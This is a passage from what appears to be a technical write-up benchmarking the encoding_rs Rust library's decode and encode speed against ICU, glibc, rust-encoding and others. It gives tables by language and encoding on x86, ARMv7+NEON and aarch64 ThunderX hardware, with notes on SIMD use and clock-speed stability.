<td></td>
<td></td>
<td>4.74</td>
<td>3.47</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Czech, UTF-16LE</th>
<td>13.54</td>
<td>6.33</td>
<td></td>
<td>4.17</td>
<td></td>
<td></td>
<td>7.20</td>
<td>5.33</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
German, UTF-16LE</th>
<td>13.48</td>
<td>6.34</td>
<td></td>
<td>4.18</td>
<td></td>
<td></td>
<td>14.87</td>
<td>10.86</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Greek, UTF-16LE</th>
<td>13.49</td>
<td>6.33</td>
<td></td>
<td>4.18</td>
<td></td>
<td></td>
<td>5.70</td>
<td>4.16</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
English, UTF-16LE</th>
<td>13.43</td>
<td>6.33</td>
<td></td>
<td>4.17</td>
<td></td>
<td></td>
<td>32.86</td>
<td>24.17</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
French, UTF-16LE</th>
<td>13.51</td>
<td>6.33</td>
<td></td>
<td>4.17</td>
<td></td>
<td></td>
<td>11.58</td>
<td>8.43</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Hebrew, UTF-16LE</th>
<td>13.50</td>
<td>6.33</td>
<td></td>
<td>4.18</td>
<td></td>
<td></td>
<td>4.55</td>
<td>3.38</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Portuguese, UTF-16LE</th>
<td>13.50</td>
<td>6.33</td>
<td></td>
<td>4.17</td>
<td></td>
<td></td>
<td>13.66</td>
<td>9.94</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Russian, UTF-16LE</th>
<td>13.52</td>
<td>6.33</td>
<td></td>
<td>4.17</td>
<td></td>
<td></td>
<td>5.00</td>
<td>3.63</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Thai, UTF-16LE</th>
<td>13.33</td>
<td>6.33</td>
<td></td>
<td>4.17</td>
<td></td>
<td></td>
<td>8.40</td>
<td>6.03</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Turkish, UTF-16LE</th>
<td>13.42</td>
<td>6.33</td>
<td></td>
<td>4.17</td>
<td></td>
<td></td>
<td>6.47</td>
<td>4.83</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Vietnamese, UTF-16LE</th>
<td>13.51</td>
<td>6.33</td>
<td></td>
<td>4.17</td>
<td></td>
<td></td>
<td>5.48</td>
<td>4.13</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Simplified Chinese, UTF-16LE</th>
<td>13.52</td>
<td>6.33</td>
<td></td>
<td>8.38</td>
<td></td>
<td></td>
<td>7.60</td>
<td>5.59</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Traditional Chinese, UTF-16LE</th>
<td>13.48</td>
<td>6.33</td>
<td></td>
<td>8.38</td>
<td></td>
<td></td>
<td>7.58</td>
<td>5.58</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Japanese, UTF-16LE</th>
<td>13.54</td>
<td>6.33</td>
<td></td>
<td>4.18</td>
<td></td>
<td></td>
<td>6.69</td>
<td>4.90</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Korean, UTF-16LE</th>
<td>13.84</td>
<td>6.49</td>
<td></td>
<td>4.29</td>
<td></td>
<td></td>
<td>5.49</td>
<td>4.14</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Arabic, UTF-16BE</th>
<td>11.30</td>
<td>5.29</td>
<td></td>
<td>3.49</td>
<td></td>
<td></td>
<td>4.17</td>
<td>3.11</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Czech, UTF-16BE</th>
<td>11.15</td>
<td>5.29</td>
<td></td>
<td>3.49</td>
<td></td>
<td></td>
<td>6.59</td>
<td>5.04</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
German, UTF-16BE</th>
<td>11.32</td>
<td>5.29</td>
<td></td>
<td>3.49</td>
<td></td>
<td></td>
<td>12.85</td>
<td>9.79</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Greek, UTF-16BE</th>
<td>11.30</td>
<td>5.28</td>
<td></td>
<td>3.49</td>
<td></td>
<td></td>
<td>5.00</td>
<td>3.73</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
English, UTF-16BE</th>
<td>11.26</td>
<td>5.29</td>
<td></td>
<td>3.48</td>
<td></td>
<td></td>
<td>26.03</td>
<td>20.02</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
French, UTF-16BE</th>
<td>11.28</td>
<td>5.29</td>
<td></td>
<td>3.48</td>
<td></td>
<td></td>
<td>10.09</td>
<td>7.70</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Hebrew, UTF-16BE</th>
<td>11.26</td>
<td>5.28</td>
<td></td>
<td>3.49</td>
<td></td>
<td></td>
<td>4.04</td>
<td>3.03</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Portuguese, UTF-16BE</th>
<td>11.29</td>
<td>5.29</td>
<td></td>
<td>3.49</td>
<td></td>
<td></td>
<td>11.77</td>
<td>8.98</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Russian, UTF-16BE</th>
<td>11.27</td>
<td>5.29</td>
<td></td>
<td>3.48</td>
<td></td>
<td></td>
<td>4.43</td>
<td>3.27</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Thai, UTF-16BE</th>
<td>11.22</td>
<td>5.29</td>
<td></td>
<td>3.48</td>
<td></td>
<td></td>
<td>7.63</td>
<td>5.63</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Turkish, UTF-16BE</th>
<td>11.31</td>
<td>5.29</td>
<td></td>
<td>3.49</td>
<td></td>
<td></td>
<td>5.97</td>
<td>4.60</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Vietnamese, UTF-16BE</th>
<td>11.29</td>
<td>5.29</td>
<td></td>
<td>3.48</td>
<td></td>
<td></td>
<td>5.03</td>
<td>3.87</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Simplified Chinese, UTF-16BE</th>
<td>11.27</td>
<td>5.29</td>
<td></td>
<td>7.00</td>
<td></td>
<td></td>
<td>6.85</td>
<td>5.17</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Traditional Chinese, UTF-16BE</th>
<td>11.31</td>
<td>5.29</td>
<td></td>
<td>7.00</td>
<td></td>
<td></td>
<td>6.84</td>
<td>5.16</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Japanese, UTF-16BE</th>
<td>11.31</td>
<td>5.29</td>
<td></td>
<td>3.49</td>
<td></td>
<td></td>
<td>6.08</td>
<td>4.55</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Korean, UTF-16BE</th>
<td>11.44</td>
<td>5.36</td>
<td></td>
<td>3.54</td>
<td></td>
<td></td>
<td>4.90</td>
<td>3.77</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>

<p>The above table shows the results with the SIMD enabled for encoding_rs but without encode-specific data tables beyond 32 bits of encode-specefic data for each single-byte encoding).</p>

<p>With indexable lookup tables for the CJK Unified Ideographs and Hangul Syllables Unicode blocks, but otherwise retaining the same encoder structure, encoding_rs performs CJK legacy encode like this:</p>

<table>
	<thead>
	<tr><td rowspan="3"></td><th colspan="5">Encode</th></tr>
	<tr><th colspan="3">UTF-16</th><th colspan="2">UTF-8</th></tr>
	<tr>
	<th>
	uconv</th>
	<th>
	ICU</th>
	<th>
	kernel32</th>
	<th>
	rust-encoding</th>
	<th>
	glibc</th>
	</tr>
	</thead>
	<tbody>
		<tr>
			<th>Simplified Chinese, gb18030</th>
			<td>24.53</td>
			<td>0.74</td>
			<td>2.42</td>
			<td>0.97</td>
			<td>0.80</td>
		</tr>
		<tr>
			<th>Traditional Chinese, Big5</th>
			<td>160.73</td>
			<td>0.68</td>
			<td>0.31</td>
			<td>1.30</td>
			<td>2.07</td>
		</tr>
		<tr>
			<th>Japanese, EUC-JP</th>
			<td>47.25</td>
			<td>0.68</td>
			<td>0.21</td>
			<td>0.93</td>
			<td>5.29</td>
		</tr>
		<tr>
			<th>Japanese, ISO-2022-JP</th>
			<td>20.81</td>
			<td>1.99</td>
			<td>2.10</td>
			<td>0.94</td>
			<td>4.56</td>
		</tr>
		<tr>
			<th>Japanese, Shift_JIS</th>
			<td>29.04</td>
			<td>0.59</td>
			<td>0.26</td>
			<td>1.41</td>
			<td>1.01</td>
		</tr>
		<tr>
			<th>Korean, EUC-KR</th>
			<td>372.45</td>
			<td>1.36</td>
			<td>0.90</td>
			<td>2.15</td>
			<td>2.05</td>
		</tr>
	</tbody>
</table>

<h5>ARMv7+NEON Exynos 5</h5>

<p>Windows 10 is not available, kewb is not optimized for ARM, and browsers are excluded due to compilation problems. encoding_rs and rust-encoding are compiled with NEON enabled. Only encoding_rs uses NEON explicitly. Notably, NEON is less suited for feeding back into control flow than SSE2, so NEON is not used for validating ASCII, so the comparison with the Rust standard library ends up being an ALU vs. ALU comparison.

</p><table>
<thead>
<tr><td rowspan="3"></td><th colspan="4">Decode</th><th colspan="3">Encode</th></tr>
<tr><th colspan="1">UTF-16</th><th colspan="3">UTF-8</th><th colspan="1">UTF-16</th><th colspan="2">UTF-8</th></tr>
<tr>
<th>
ICU</th>
<th>
stdlib</th>
<th>
rust-encoding</th>
<th>
glibc</th>
<th>
ICU</th>
<th>
rust-encoding</th>
<th>
glibc</th>
</tr>
</thead><tbody>
<tr>
<th>
Arabic, UTF-8</th>
<td>2.15</td>
<td>1.21</td>
<td>2.71</td>
<td>5.28</td>
<td>0.93</td>
<td>5974.90</td>
<td>164.96</td>
</tr>
<tr>
<th>
Czech, UTF-8</th>
<td>1.96</td>
<td>1.26</td>
<td>4.19</td>
<td>7.27</td>
<td>1.13</td>
<td>10653.25</td>
<td>75.24</td>
</tr>
<tr>
<th>
German, UTF-8</th>
<td>2.89</td>
<td>1.20</td>
<td>7.13</td>
<td>11.32</td>
<td>2.54</td>
<td>5299.90</td>
<td>57.87</td>
</tr>
<tr>
<th>
Greek, UTF-8</th>
<td>2.29</td>
<td>1.17</td>
<td>3.10</td>
<td>5.96</td>
<td>0.95</td>
<td>7891.35</td>
<td>159.49</td>
</tr>
<tr>
<th>
English, UTF-8</th>
<td>4.25</td>
<td>1.07</td>
<td>13.82</td>
<td>15.11</td>
<td>4.66</td>
<td>2038.65</td>
<td>57.17</td>
</tr>
<tr>
<th>
JavaScript, UTF-8</th>
<td>5.15</td>
<td>1.01</td>
<td>6.97</td>
<td>18.02</td>
<td>5.63</td>
<td>2120.60</td>
<td>57.11</td>
</tr>
<tr>
<th>
French, UTF-8</th>
<td>2.73</td>
<td>1.22</td>
<td>7.95</td>
<td>9.88</td>
<td>1.61</td>
<td>16413.40</td>
<td>61.95</td>
</tr>
<tr>
<th>
Hebrew, UTF-8</th>
<td>2.08</td>
<td>1.26</td>
<td>2.77</td>
<td>5.36</td>
<td>0.96</td>
<td>13160.95</td>
<td>93.50</td>
</tr>
<tr>
<th>
Portuguese, UTF-8</th>
<td>2.80</td>
<td>1.22</td>
<td>8.66</td>
<td>10.39</td>
<td>1.87</td>
<td>6767.35</td>
<td>60.16</td>
</tr>
<tr>
<th>
Russian, UTF-8</th>
<td>2.22</td>
<td>1.20</td>
<td>3.45</td>
<td>5.36</td>
<td>0.97</td>
<td>28588.75</td>
<td>98.30</td>
</tr>
<tr>
<th>
Thai, UTF-8</th>
<td>3.32</td>
<td>1.41</td>
<td>6.11</td>
<td>9.33</td>
<td>1.84</td>
<td>28600.00</td>
<td>143.92</td>
</tr>
<tr>
<th>
Turkish, UTF-8</th>
<td>1.84</td>
<td>1.25</td>
<td>3.78</td>
<td>6.74</td>
<td>1.13</td>
<td>12253.10</td>
<td>73.99</td>
</tr>
<tr>
<th>
Vietnamese, UTF-8</th>
<td>1.76</td>
<td>1.32</td>
<td>4.06</td>
<td>6.11</td>
<td>1.06</td>
<td>29650.00</td>
<td>111.16</td>
</tr>
<tr>
<th>
Simplified Chinese, UTF-8</th>
<td>2.46</td>
<td>1.43</td>
<td>4.09</td>
<td>7.94</td>
<td>1.82</td>
<td>5748.35</td>
<td>238.95</td>
</tr>
<tr>
<th>
Traditional Chinese, UTF-8</th>
<td>2.46</td>
<td>1.43</td>
<td>4.16</td>
<td>8.01</td>
<td>1.82</td>
<td>5872.95</td>
<td>171.07</td>
</tr>
<tr>
<th>
Japanese, UTF-8</th>
<td>2.48</td>
<td>1.45</td>
<td>3.79</td>
<td>8.92</td>
<td>1.88</td>
<td>5498.10</td>
<td>168.30</td>
</tr>
<tr>
<th>
Korean, UTF-8</th>
<td>2.02</td>
<td>1.40</td>
<td>3.21</td>
<td>6.49</td>
<td>1.25</td>
<td>5938.90</td>
<td>198.42</td>
</tr>
<tr>
<th>
Arabic, windows-1256</th>
<td>0.58</td>
<td></td>
<td>3.01</td>
<td>3.66</td>
<td>0.36</td>
<td>0.96</td>
<td>1.08</td>
</tr>
<tr>
<th>
Czech, windows-1250</th>
<td>0.96</td>
<td></td>
<td>4.11</td>
<td>6.73</td>
<td>0.54</td>
<td>1.02</td>
<td>1.20</td>
</tr>
<tr>
<th>
German, windows-1252</th>
<td>1.72</td>
<td></td>
<td>5.64</td>
<td>14.03</td>
<td>2.89</td>
<td>6.06</td>
<td>7.14</td>
</tr>
<tr>
<th>
Greek, windows-1253</th>
<td>0.73</td>
<td></td>
<td>3.03</td>
<td>4.65</td>
<td>1.09</td>
<td>2.49</td>
<td>2.26</td>
</tr>
<tr>
<th>
English, windows-1252</th>
<td>2.66</td>
<td></td>
<td>6.79</td>
<td>27.79</td>
<td>5.08</td>
<td>20.01</td>
<td>24.02</td>
</tr>
<tr>
<th>
French, windows-1252</th>
<td>1.39</td>
<td></td>
<td>4.69</td>
<td>9.69</td>
<td>1.80</td>
<td>3.24</td>
<td>3.86</td>
</tr>
<tr>
<th>
Hebrew, windows-1255</th>
<td>0.58</td>
<td></td>
<td>2.68</td>
<td>4.42</td>
<td>1.14</td>
<td>2.58</td>
<td>2.22</td>
</tr>
<tr>
<th>
Portuguese, windows-1252</th>
<td>1.64</td>
<td></td>
<td>5.61</td>
<td>12.78</td>
<td>2.16</td>
<td>4.09</td>
<td>4.77</td>
</tr>
<tr>
<th>
Russian, windows-1251</th>
<td>0.60</td>
<td></td>
<td>3.15</td>
<td>3.79</td>
<td>1.16</td>
<td>2.65</td>
<td>2.35</td>
</tr>
<tr>
<th>
Thai, windows-874</th>
<td>0.98</td>
<td></td>
<td>3.64</td>
<td>5.88</td>
<td>0.60</td>
<td>1.87</td>
<td>2.46</td>
</tr>
<tr>
<th>
Turkish, windows-1254</th>
<td>0.87</td>
<td></td>
<td>3.85</td>
<td>6.07</td>
<td>0.65</td>
<td>1.22</td>
<td>1.48</td>
</tr>
<tr>
<th>
Simplified Chinese, gb18030</th>
<td>1.74</td>
<td></td>
<td>4.08</td>
<td>4.02</td>
<td>0.01</td>
<td>0.01</td>
<td>0.02</td>
</tr>
<tr>
<th>
Traditional Chinese, Big5</th>
<td>1.73</td>
<td></td>
<td>4.57</td>
<td>4.40</td>
<td>0.01</td>
<td>0.02</td>
<td>0.04</td>
</tr>
<tr>
<th>
Japanese, EUC-JP</th>
<td>1.61</td>
<td></td>
<td>3.91</td>
<td>4.26</td>
<td>0.03</td>
<td>0.04</td>
<td>0.22</td>
</tr>
<tr>
<th>
Japanese, ISO-2022-JP</th>
<td>1.96</td>
<td></td>
<td>2.12</td>
<td>1.98</td>
<td>0.09</td>
<td>0.04</td>
<td>0.20</td>
</tr>
<tr>
<th>
Japanese, Shift_JIS</th>
<td>1.41</td>
<td></td>
<td>3.46</td>
<td>3.77</td>
<td>0.02</td>
<td>0.04</td>
<td>0.06</td>
</tr>
<tr>
<th>
Korean, EUC-KR</th>
<td>1.73</td>
<td></td>
<td>5.75</td>
<td>4.59</td>
<td>0.29</td>
<td>0.57</td>
<td>0.51</td>
</tr>
<tr>
<th>
x-user-defined</th>
<td></td>
<td></td>
<td>2.44</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Arabic, UTF-16LE</th>
<td>4.64</td>
<td></td>
<td>2.64</td>
<td>3.64</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Czech, UTF-16LE</th>
<td>4.65</td>
<td></td>
<td>3.51</td>
<td>5.71</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
German, UTF-16LE</th>
<td>4.64</td>
<td></td>
<td>4.61</td>
<td>9.66</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Greek, UTF-16LE</th>
<td>4.73</td>
<td></td>
<td>2.87</td>
<td>4.19</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
English, UTF-16LE</th>
<td>4.51</td>
<td></td>
<td>5.52</td>
<td>13.75</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
French, UTF-16LE</th>
<td>3.03</td>
<td></td>
<td>4.07</td>
<td>7.10</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Hebrew, UTF-16LE</th>
<td>4.75</td>
<td></td>
<td>2.60</td>
<td>3.57</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Portuguese, UTF-16LE</th>
<td>4.61</td>
<td></td>
<td>5.19</td>
<td>9.23</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Russian, UTF-16LE</th>
<td>4.59</td>
<td></td>
<td>3.12</td>
<td>3.82</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Thai, UTF-16LE</th>
<td>3.78</td>
<td></td>
<td>3.66</td>
<td>6.59</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Turkish, UTF-16LE</th>
<td>4.61</td>
<td></td>
<td>3.33</td>
<td>5.22</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Vietnamese, UTF-16LE</th>
<td>4.59</td>
<td></td>
<td>3.54</td>
<td>4.80</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Simplified Chinese, UTF-16LE</th>
<td>4.61</td>
<td></td>
<td>3.32</td>
<td>5.88</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Traditional Chinese, UTF-16LE</th>
<td>4.61</td>
<td></td>
<td>3.32</td>
<td>5.87</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Japanese, UTF-16LE</th>
<td>4.74</td>
<td></td>
<td>3.02</td>
<td>5.35</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Korean, UTF-16LE</th>
<td>4.73</td>
<td></td>
<td>4.24</td>
<td>4.59</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Arabic, UTF-16BE</th>
<td>2.85</td>
<td></td>
<td>2.30</td>
<td>3.11</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Czech, UTF-16BE</th>
<td>2.84</td>
<td></td>
<td>3.02</td>
<td>4.68</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
German, UTF-16BE</th>
<td>2.84</td>
<td></td>
<td>3.94</td>
<td>7.49</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Greek, UTF-16BE</th>
<td>2.93</td>
<td></td>
<td>2.50</td>
<td>3.55</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
English, UTF-16BE</th>
<td>2.79</td>
<td></td>
<td>4.70</td>
<td>10.07</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
French, UTF-16BE</th>
<td>2.05</td>
<td></td>
<td>3.38</td>
<td>5.37</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Hebrew, UTF-16BE</th>
<td>2.93</td>
<td></td>
<td>2.27</td>
<td>3.06</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Portuguese, UTF-16BE</th>
<td>2.87</td>
<td></td>
<td>4.44</td>
<td>7.19</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Russian, UTF-16BE</th>
<td>2.83</td>
<td></td>
<td>2.75</td>
<td>3.24</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Thai, UTF-16BE</th>
<td>2.49</td>
<td></td>
<td>3.09</td>
<td>5.33</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Turkish, UTF-16BE</th>
<td>2.83</td>
<td></td>
<td>2.85</td>
<td>4.30</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Vietnamese, UTF-16BE</th>
<td>2.85</td>
<td></td>
<td>3.03</td>
<td>3.98</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Simplified Chinese, UTF-16BE</th>
<td>2.83</td>
<td></td>
<td>2.85</td>
<td>4.84</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Traditional Chinese, UTF-16BE</th>
<td>2.82</td>
<td></td>
<td>2.87</td>
<td>4.84</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Japanese, UTF-16BE</th>
<td>2.94</td>
<td></td>
<td>2.62</td>
<td>4.52</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Korean, UTF-16BE</th>
<td>2.93</td>
<td></td>
<td>3.51</td>
<td>3.88</td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>

<h5>aarch64 ThunderX</h5>

<p>I lack access to Windows 10 on aarch64, kewb is not optimized for aarch64, either, and browsers were excluded for compilation problems. As with x86_64, SIMD is part of the baseline compiler target instruction set on aarch64.

</p><p>While I was not paying attention, ALU code for ASCII validation has gained speed relative to SIMD-based ASCII validation. I suspect this might be due to LLVM updates since LLVM 4. For this reason, I have moved aarch64 to use ALU code for ASCII validation pending more investigation of how to fix the SIMD code.

</p><p>These numbers are from ThunderX, which is a server chip. Furthermore, this is the first-generation ThunderX, which is an in-order design. Benchmarking on phones does not make sense, because their clock speeds vary all over all the time due to thermal throttling, so benchmark results are not repeatable. Moreover, the thermal throttling may be rather fine-grained, so it is not feasible to identify throttling by looking at a clear 50% drop as is feasible e.g. with Raspberry Pi 3. The problem with ThunderX and Raspberry Pi 3 is that they use cores with in-order designs while high-end phones use more advanced out-of-order designs. It is quite frustrating that there is not good information about what non-phone computers with aarch64 chips might be able to hold a stable clock speed when running a compute benchmark for the purpose of testing small changes in implementation details. Stable clock speed is not a characteristic of ARM hardware and kernel combination that gets advertised or talked about on forums. (In the ARMv7+NEON case, I just happened to discover that a piece of hardware, Samsung Chromebook 2 with Crouton, suited my needs.)

</p><table>
<thead>
<tr><td rowspan="3"></td><th colspan="4">Decode</th><th colspan="3">Encode</th></tr>
<tr><th colspan="1">UTF-16</th><th colspan="3">UTF-8</th><th colspan="1">UTF-16</th><th colspan="2">UTF-8</th></tr>
<tr>
<th>
ICU</th>
<th>
stdlib</th>
<th>
rust-encoding</th>
<th>
glibc</th>
<th>
ICU</th>
<th>
rust-encoding</th>
<th>
glibc</th>
</tr>
</thead><tbody>
<tr>
<th>
Arabic, UTF-8</th>
<td>1.81</td>
<td>1.14</td>
<td>3.53</td>
<td>5.74</td>
<td>0.85</td>
<td>4358.21</td>
<td>43.56</td>
</tr>
<tr>
<th>
Czech, UTF-8</th>
<td>1.63</td>
<td>1.19</td>
<td>5.72</td>
<td>7.97</td>
<td>1.00</td>
<td>7739.88</td>
<td>24.20</td>
</tr>
<tr>
<th>
German, UTF-8</th>
<td>1.89</td>
<td>1.16</td>
<td>8.67</td>
<td>10.77</td>
<td>1.96</td>
<td>5448.46</td>
<td>20.42</td>
</tr>
<tr>
<th>
Greek, UTF-8</th>
<td>1.91</td>
<td>1.16</td>
<td>4.16</td>
<td>6.55</td>
<td>0.88</td>
<td>6339.08</td>
<td>36.21</td>
</tr>
<tr>
<th>
English, UTF-8</th>
<td>2.10</td>
<td>1.03</td>
<td>10.98</td>
<td>12.73</td>
<td>2.57</td>
<td>2585.88</td>
<td>19.28</td>
</tr>
<tr>
<th>
JavaScript, UTF-8</th>
<td>2.49</td>
<td>1.01</td>
<td>9.24</td>
<td>17.81</td>
<td>4.18</td>
<td>3874.54</td>
<td>39.83</td>
</tr>
<tr>
<th>
French, UTF-8</th>
<td>1.79</td>
<td>1.17</td>
<td>7.59</td>
<td>10.03</td>
<td>1.48</td>
<td>14883.29</td>
<td>21.76</td>
</tr>
<tr>
<th>
Hebrew, UTF-8</th>
<td>1.77</td>
<td>1.16</td>
<td>3.56</td>
<td>5.82</td>
<td>0.86</td>
<td>10102.21</td>
<td>30.73</td>
</tr>
<tr>
<th>
Portuguese, UTF-8</th>
<td>1.88</td>
<td>1.16</td>
<td>8.43</td>
<td>10.46</td>
<td>1.64</td>
<td>6257.67</td>
<td>20.99</td>
</tr>
<tr>
<th>
Russian, UTF-8</th>
<td>1.90</td>
<td>1.17</td>
<td>3.73</td>
<td>6.08</td>
<td>0.91</td>
<td>22567.83</td>
<td>29.29</td>
</tr>
<tr>
<th>
Thai, UTF-8</th>
<td>2.28</td>
<td>1.05</td>
<td>4.43</td>
<td>6.74</td>
<td>1.29</td>
<td>29472.83</td>
<td>24.38</td>
</tr>
<tr>
<th>
Turkish, UTF-8</th>
<td>1.59</td>
<td>1.21</td>
<td>5.35</td>
<td>7.63</td>
<td>1.02</td>
<td>9224.92</td>
<td>23.80</td>
</tr>
<tr>
<th>
Vietnamese, UTF-8</th>
<td>1.55</td>
<td>1.12</td>
<td>4.27</td>
<td>6.33</td>
<td>0.84</td>
<td>20106.71</td>
<td>26.71</td>
</tr>
<tr>
<th>
Simplified Chinese, UTF-8</th>
<td>1.98</td>
<td>1.19</td>
<td>4.67</td>
<td>6.83</td>
<td>1.27</td>
<td>5704.42</td>
<td>35.09</td>
</tr>
<tr>
<th>
Traditional Chinese, UTF-8</th>
<td>1.97</td>
<td>1.18</td>
<td>4.62</td>
<td>6.77</td>
<td>1.28</td>
<td>5706.46</td>
<td>35.22</td>
</tr>
<tr>
<th>
Japanese, UTF-8</th>
<td>2.05</td>
<td>1.18</td>
<td>4.04</td>
<td>6.10</td>
<td>1.31</td>
<td>5963.42</td>
<td>76.90</td>
</tr>
<tr>
<th>
Korean, UTF-8</th>
<td>1.81</td>
<td>1.18</td>
<td>3.89</td>
<td>5.89</td>
<td>0.93</td>
<td>4173.88</td>
<td>37.93</td>
</tr>
<tr>
<th>
Arabic, windows-1256</th>
<td>1.35</td>
<td></td>
<td>4.26</td>
<td>3.29</td>
<td>0.44</td>
<td>0.86</td>
<td>1.00</td>
</tr>
<tr>
<th>
Czech, windows-1250</th>
<td>1.72</td>
<td></td>
<td>6.75</td>
<td>5.68</td>
<td>0.62</td>
<td>1.07</td>
<td>1.12</td>
</tr>
<tr>
<th>
German, windows-1252</th>
<td>2.12</td>
<td></td>
<td>9.87</td>
<td>8.33</td>
<td>3.17</td>
<td>6.46</td>
<td>6.71</td>
</tr>
<tr>
<th>
Greek, windows-1253</th>
<td>1.50</td>
<td></td>
<td>4.93</td>
<td>3.87</td>
<td>1.26</td>
<td>1.74</td>
<td>1.56</td>
</tr>
<tr>
<th>
English, windows-1252</th>
<td>2.32</td>
<td></td>
<td>12.30</td>
<td>10.39</td>
<td>4.28</td>
<td>11.15</td>
<td>11.59</td>
</tr>
<tr>
<th>
French, windows-1252</th>
<td>1.98</td>
<td></td>
<td>8.72</td>
<td>7.36</td>
<td>2.38</td>
<td>4.23</td>
<td>4.36</td>
</tr>
<tr>
<th>
Hebrew, windows-1255</th>
<td>1.34</td>
<td></td>
<td>4.32</td>
<td>4.09</td>
<td>1.26</td>
<td>1.73</td>
<td>1.36</td>
</tr>
<tr>
<th>
Portuguese, windows-1252</th>
<td>2.08</td>
<td></td>
<td>9.60</td>
<td>8.04</td>
<td>2.68</td>
<td>4.98</td>
<td>5.15</td>
</tr>
<tr>
<th>
Russian, windows-1251</th>
<td>1.37</td>
<td></td>
<td>4.37</td>
<td>3.43</td>
<td>1.27</td>
<td>1.76</td>
<td>1.52</td>
</tr>
<tr>
<th>
Thai, windows-874</th>
<td>1.69</td>
<td></td>
<td>5.04</td>
<td>4.11</td>
<td>0.82</td>
<td>1.33</td>
<td>1.14</td>
</tr>
<tr>
<th>
